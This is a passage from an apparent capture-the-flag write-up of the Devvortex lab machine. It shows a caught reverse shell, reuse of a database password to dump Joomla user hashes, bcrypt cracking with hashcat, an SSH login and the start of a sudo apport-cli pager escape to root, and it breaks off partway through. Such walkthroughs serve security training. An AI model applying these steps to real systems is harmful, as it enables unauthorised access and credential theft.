</span></span><span class="line"><span class="cl"><span class="err">‚îî‚îÄ</span><span class="o">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nvlp</span> <span class="mi">8000</span>
</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">8000</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.102</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.242</span><span class="p">]</span> <span class="mi">56650</span>
</span></span><span class="line"><span class="cl"><span class="n">Linux</span> <span class="n">devvortex</span> <span class="mf">5.4</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">167</span><span class="o">-</span><span class="n">generic</span> <span class="c1">#184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class="line"><span class="cl"> <span class="mi">23</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">26</span> <span class="n">up</span>  <span class="mi">3</span><span class="p">:</span><span class="mi">36</span><span class="p">,</span>  <span class="mi">1</span> <span class="n">user</span><span class="p">,</span>  <span class="nb">load</span> <span class="n">average</span><span class="p">:</span> <span class="mf">3.71</span><span class="p">,</span> <span class="mf">1.14</span><span class="p">,</span> <span class="mf">0.44</span>
</span></span><span class="line"><span class="cl"><span class="n">USER</span>     <span class="n">TTY</span>      <span class="n">FROM</span>             <span class="n">LOGIN</span><span class="err">@</span>   <span class="n">IDLE</span>   <span class="n">JCPU</span>   <span class="n">PCPU</span> <span class="n">WHAT</span>
</span></span><span class="line"><span class="cl"><span class="n">logan</span>    <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.203</span>     <span class="mi">21</span><span class="p">:</span><span class="mi">26</span>   <span class="mi">50</span><span class="p">:</span><span class="mi">30</span>   <span class="mf">0.49</span><span class="n">s</span>  <span class="mf">0.03</span><span class="n">s</span> <span class="n">sshd</span><span class="p">:</span> <span class="n">logan</span> <span class="p">[</span><span class="n">priv</span><span class="p">]</span>  
</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t access tty; job control turned off</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">id</span>
</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="lateral-movement">Lateral Movement
</h2><h3 id="reusing-credentials-to-access-mysql">Reusing credentials to access mysql
</h3><p>We need to improve the stability of the shell; my preferred way is using <code>script</code>, although python is common as well:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ script -qc /bin/bash /dev/null
</span></span><span class="line"><span class="cl">www-data@devvortex:/$ ^Z
</span></span><span class="line"><span class="cl">zsh: suspended  nc -nvlp 8000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Devvortex]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ stty raw -echo; fg 
</span></span><span class="line"><span class="cl">[1]  + continued  nc -nvlp 8000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@devvortex:/$ id
</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span><span class="line"><span class="cl">www-data@devvortex:/$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>^Z</code> refers to backgrounding the shell session, where we enter <code>stty raw -echo; fg</code> in our kali session.
Using netstat, we can see mysql is running on port 3306:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@devvortex:/$ netstat -ntlp
</span></span><span class="line"><span class="cl">(Not all processes could be identified, non-owned process info
</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.)
</span></span><span class="line"><span class="cl">Active Internet connections (only servers)
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      894/nginx: worker p 
</span></span><span class="line"><span class="cl">tcp6       0      0 :::22                   :::*                    LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp6       0      0 :::80                   :::*                    LISTEN      894/nginx: worker p 
</span></span></code></pre></td></tr></table>
</div>
</div><p>When we try recycling credentials for lewis, we find that we can enter the mysql database!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
</span></span><span class="line"><span class="cl">Enter password: 
</span></span><span class="line"><span class="cl">Welcome to the MySQL monitor.  Commands end with ; or \g.
</span></span><span class="line"><span class="cl">Your MySQL connection id is 12678
</span></span><span class="line"><span class="cl">Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright (c) 2000, 2023, Oracle and/or its affiliates.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span class="line"><span class="cl">affiliates. Other names may be trademarks of their respective
</span></span><span class="line"><span class="cl">owners.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finding joomla database:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql&gt; show databases;
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl">| Database           |
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl">| information_schema |
</span></span><span class="line"><span class="cl">| joomla             |
</span></span><span class="line"><span class="cl">| performance_schema |
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl">3 rows in set (0.00 sec)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finding user table:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql&gt; show tables;
</span></span><span class="line"><span class="cl">+-------------------------------+
</span></span><span class="line"><span class="cl">| Tables_in_joomla              |
</span></span><span class="line"><span class="cl">+-------------------------------+
</span></span><span class="line"><span class="cl">| sd4fg_action_log_config       |
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">| sd4fg_user_keys               |
</span></span><span class="line"><span class="cl">| sd4fg_user_mfa                |
</span></span><span class="line"><span class="cl">| sd4fg_user_notes              |
</span></span><span class="line"><span class="cl">| sd4fg_user_profiles           |
</span></span><span class="line"><span class="cl">| sd4fg_user_usergroup_map      |
</span></span><span class="line"><span class="cl">| sd4fg_usergroups              |
</span></span><span class="line"><span class="cl">| sd4fg_users                   |
</span></span><span class="line"><span class="cl">| sd4fg_viewlevels              |
</span></span><span class="line"><span class="cl">| sd4fg_webauthn_credentials    |
</span></span><span class="line"><span class="cl">| sd4fg_workflow_associations   |
</span></span><span class="line"><span class="cl">| sd4fg_workflow_stages         |
</span></span><span class="line"><span class="cl">| sd4fg_workflow_transitions    |
</span></span><span class="line"><span class="cl">| sd4fg_workflows               |
</span></span><span class="line"><span class="cl">+-------------------------------+
</span></span><span class="line"><span class="cl">71 rows in set (0.01 sec)
</span></span></code></pre></td></tr></table>
</div>
</div><p>users and user_profiles are most interesting, so we start with them:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql&gt; select * from sd4fg_users;
</span></span><span class="line"><span class="cl">+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
</span></span><span class="line"><span class="cl">| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
</span></span><span class="line"><span class="cl">+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
</span></span><span class="line"><span class="cl">| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-04-29 23:04:44 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
</span></span><span class="line"><span class="cl">| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {&#34;admin_style&#34;:&#34;&#34;,&#34;admin_language&#34;:&#34;&#34;,&#34;language&#34;:&#34;&#34;,&#34;editor&#34;:&#34;&#34;,&#34;timezone&#34;:&#34;&#34;,&#34;a11y_mono&#34;:&#34;0&#34;,&#34;a11y_contrast&#34;:&#34;0&#34;,&#34;a11y_highlight&#34;:&#34;0&#34;,&#34;a11y_font&#34;:&#34;0&#34;} | NULL          |          0 |        |      |            0 |              |
</span></span><span class="line"><span class="cl">+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>The format is messy, but with this we can see a hash for another user Logan Paul. We can check home folders and see that logan is a user on this system:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@devvortex:/$ ls /home
</span></span><span class="line"><span class="cl">logan
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using <code>hashid</code> we can see that this is blowfish/bcrypt encryption:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ hashid &#39;$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12&#39;
</span></span><span class="line"><span class="cl">Analyzing &#39;$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12&#39;
</span></span><span class="line"><span class="cl">[+] Blowfish(OpenBSD) 
</span></span><span class="line"><span class="cl">[+] Woltlab Burning Board 4.x 
</span></span><span class="line"><span class="cl">[+] bcrypt 
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can crack this hash using  <code>hashcat</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ hashcat -m 3200 &#39;$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12&#39; /usr/share/wordlists/rockyou.txt 
</span></span><span class="line"><span class="cl">hashcat (v6.2.5) starting
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Successfully initialized NVIDIA CUDA library.
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
</span></span><span class="line"><span class="cl">                                                          
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
</span></span><span class="line"><span class="cl">Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
</span></span><span class="line"><span class="cl">Time.Started.....: Sun Nov 26 01:14:03 2023 (7 secs)
</span></span><span class="line"><span class="cl">Time.Estimated...: Sun Nov 26 01:14:10 2023 (0 secs)
</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
</span></span><span class="line"><span class="cl">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 (100.00%)
</span></span><span class="line"><span class="cl">Speed.#1.........:      187 H/s (7.49ms) @ Accel:16 Loops:8 Thr:11 Vec:1
</span></span><span class="line"><span class="cl">Recovered........: 1/1 (100.00%) Digests
</span></span><span class="line"><span class="cl">Progress.........: 1408/14344384 (0.01%)
</span></span><span class="line"><span class="cl">Rejected.........: 0/1408 (0.00%)
</span></span><span class="line"><span class="cl">Restore.Point....: 1232/14344384 (0.01%)
</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
</span></span><span class="line"><span class="cl">Candidates.#1....: pedro -&gt; tagged
</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 64c Fan: 29% Util: 99% Core:1316MHz Mem:3505MHz Bus:16
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Started: Sun Nov 26 01:14:02 2023
</span></span><span class="line"><span class="cl">Stopped: Sun Nov 26 01:14:11 2023
</span></span></code></pre></td></tr></table>
</div>
</div><p>We now have a new pair of credentials as <code>logan:tequieromucho</code>. We can use this to ssh directly into the machine:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ ssh logan@devvortex.htb
</span></span><span class="line"><span class="cl">The authenticity of host &#39;devvortex.htb (10.10.11.242)&#39; can&#39;t be established.
</span></span><span class="line"><span class="cl">ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
</span></span><span class="line"><span class="cl">This key is not known by any other names.
</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;devvortex.htb&#39; (ED25519) to the list of known hosts.
</span></span><span class="line"><span class="cl">logan@devvortex.htb&#39;s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">logan@devvortex:~$ 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation">Privilege Escalation
</h2><h3 id="using-file-viewer-less-to-retain-a-privileged-shell-session">Using file viewer &rsquo;less&rsquo; to retain a privileged shell session
</h3><p>Checking sudo privileges:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">logan@devvortex:/tmp$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for logan on devvortex:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User logan may run the following commands on devvortex:
</span></span><span class="line"><span class="cl">    (ALL : ALL) /usr/bin/apport-cli
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can get more information from the tool by checking the man page:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">DESCRIPTION</span>
</span></span><span class="line"><span class="cl">       <span class="n">apport</span>  <span class="n">automatically</span>  <span class="n">collects</span>  <span class="n">data</span>  <span class="n">from</span>  <span class="n">crashed</span> <span class="n">processes</span> <span class="ow">and</span> <span class="n">compiles</span> <span class="n">a</span> <span class="n">problem</span> <span class="n">report</span> <span class="ow">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">crash</span><span class="o">/.</span> <span class="n">This</span> <span class="n">is</span> <span class="n">a</span> <span class="n">command</span> <span class="n">line</span> <span class="n">frontend</span> <span class="k">for</span> <span class="n">reporting</span> <span class="n">those</span> <span class="n">crashes</span> <span class="n">to</span> <span class="n">the</span> <span class="n">developers</span><span class="o">.</span> <span class="n">It</span> <span class="n">can</span> <span class="n">also</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">report</span> <span class="n">bugs</span>
</span></span><span class="line"><span class="cl">       <span class="n">about</span> <span class="n">packages</span> <span class="ow">or</span> <span class="n">running</span> <span class="n">processes</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       <span class="n">If</span> <span class="n">symptom</span> <span class="n">scripts</span> <span class="n">are</span> <span class="n">available</span><span class="p">,</span> <span class="n">it</span> <span class="n">can</span> <span class="n">also</span> <span class="n">be</span> <span class="n">given</span> <span class="n">the</span> <span class="n">name</span> <span class="n">of</span> <span class="n">a</span> <span class="n">symptom</span><span class="p">,</span> <span class="ow">or</span> <span class="n">be</span> <span class="n">called</span> <span class="n">with</span> <span class="n">just</span> <span class="o">-</span><span class="n">f</span> <span class="n">to</span> <span class="n">display</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">known</span> <span class="n">symptoms</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       <span class="n">When</span> <span class="n">being</span> <span class="n">called</span> <span class="n">without</span> <span class="n">any</span> <span class="n">options</span><span class="p">,</span> <span class="n">it</span> <span class="n">processes</span> <span class="n">the</span> <span class="n">pending</span> <span class="n">crash</span> <span class="n">reports</span> <span class="ow">and</span> <span class="n">offers</span> <span class="n">to</span> <span class="n">report</span> <span class="n">them</span> <span class="n">one</span> <span class="n">by</span> <span class="n">one</span><span class="o">.</span> <span class="n">You</span> <span class="n">can</span> <span class="n">also</span> <span class="n">display</span> <span class="n">the</span> <span class="n">entire</span> <span class="n">report</span> <span class="n">to</span> <span class="n">see</span> <span class="n">what</span> <span class="n">is</span> <span class="n">sent</span> <span class="n">to</span> <span class="n">the</span> <span class="n">software</span> <span class="n">developers</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       <span class="n">When</span> <span class="n">being</span> <span class="n">called</span> <span class="n">with</span> <span class="n">exactly</span> <span class="n">one</span> <span class="n">argument</span> <span class="ow">and</span> <span class="n">no</span> <span class="n">option</span><span class="p">,</span> <span class="n">apport</span><span class="o">-</span><span class="n">cli</span> <span class="n">uses</span> <span class="n">some</span> <span class="n">heuristics</span> <span class="n">to</span> <span class="n">find</span> <span class="n">out</span> <span class="s2">&#34;what you mean&#34;</span> <span class="ow">and</span> <span class="n">reports</span> <span class="n">a</span> <span class="n">bug</span> <span class="n">against</span> <span class="n">the</span> <span class="n">given</span> <span class="n">symptom</span> <span class="n">name</span><span class="p">,</span> <span class="n">package</span> <span class="n">name</span><span class="p">,</span> <span class="n">program</span> <span class="n">path</span><span class="p">,</span> <span class="ow">or</span> <span class="n">PID</span><span class="o">.</span> <span class="n">If</span>  <span class="n">the</span>  <span class="n">argument</span>
</span></span><span class="line"><span class="cl">       <span class="n">is</span> <span class="n">a</span> <span class="o">.</span><span class="n">crash</span> <span class="ow">or</span> <span class="o">.</span><span class="n">apport</span> <span class="n">file</span><span class="p">,</span> <span class="n">it</span> <span class="n">uploads</span> <span class="n">the</span> <span class="n">stored</span> <span class="n">problem</span> <span class="n">report</span> <span class="n">to</span> <span class="n">the</span> <span class="n">bug</span> <span class="n">tracking</span> <span class="n">system</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       <span class="n">For</span>  <span class="n">desktop</span> <span class="n">systems</span> <span class="n">with</span> <span class="n">a</span> <span class="n">graphical</span> <span class="n">user</span> <span class="n">interface</span><span class="p">,</span> <span class="n">you</span> <span class="n">should</span> <span class="n">consider</span> <span class="n">installing</span> <span class="n">the</span> <span class="n">GTK</span> <span class="ow">or</span> <span class="n">KDE</span> <span class="n">user</span> <span class="n">interface</span> <span class="p">(</span><span class="n">apport</span><span class="o">-</span><span class="n">gtk</span> <span class="ow">or</span> <span class="n">apport</span><span class="o">-</span><span class="n">kde</span><span class="p">)</span><span class="o">.</span> <span class="n">They</span> <span class="n">accept</span> <span class="n">the</span> <span class="n">very</span> <span class="n">same</span> <span class="n">options</span> <span class="ow">and</span> <span class="n">arguments</span><span class="o">.</span>  <span class="n">apport</span><span class="o">-</span><span class="n">cli</span> <span class="n">is</span> <span class="n">mainly</span> <span class="n">intended</span>
</span></span><span class="line"><span class="cl">       <span class="n">to</span> <span class="n">be</span> <span class="n">used</span> <span class="n">on</span> <span class="n">servers</span><span class="o">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It is a crash viewer/reporter tool. My thinking is if we can find a way to view a file through apport-cli, it will likely be displayed using <code>more</code> or <code>less</code>, both of which have easy ways to &ldquo;escape&rdquo; into an interactive shell where we retain our root privileges. After some tinkering, I found a way to create a crash event using <code>apport-cli</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">logan@devvortex:/tmp$ sudo /usr/bin/apport-cli -w
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*** 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">After closing this message please click on an application window to report a problem about it.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Press any key to continue... 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Traceback (most recent call last):
